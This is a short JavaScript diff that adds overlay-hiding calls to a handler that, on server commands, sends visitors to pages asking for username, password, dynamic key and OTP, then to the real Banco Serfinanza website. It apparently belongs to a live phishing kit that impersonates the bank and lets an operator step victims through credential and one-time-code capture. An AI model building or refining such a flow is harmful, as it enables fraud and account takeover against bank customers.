@@ -76,10 +76,12 @@ document.addEventListener('DOMContentLoaded', () => {
         switch(data.action) {
             case 'request_usuario':
                 console.log('👤 Redirigiendo a index.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'index.html';
                 break;
             case 'request_password':
                 console.log('🔐 Redirigiendo a password.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'password.html';
                 break;
             case 'request_dinamica':
@@ -91,10 +93,12 @@ document.addEventListener('DOMContentLoaded', () => {
                 break;
             case 'request_otp':
                 console.log('📱 Redirigiendo a otp.html');
+                BancoUtils.hideOverlay();
                 window.location.href = 'otp.html';
                 break;
             case 'finish':
                 console.log('✅ Finalizando - redirigiendo a bancoserfinanza.com');
+                BancoUtils.hideOverlay();
                 window.location.href = 'https://bancoserfinanza.com/';
                 break;
             default:
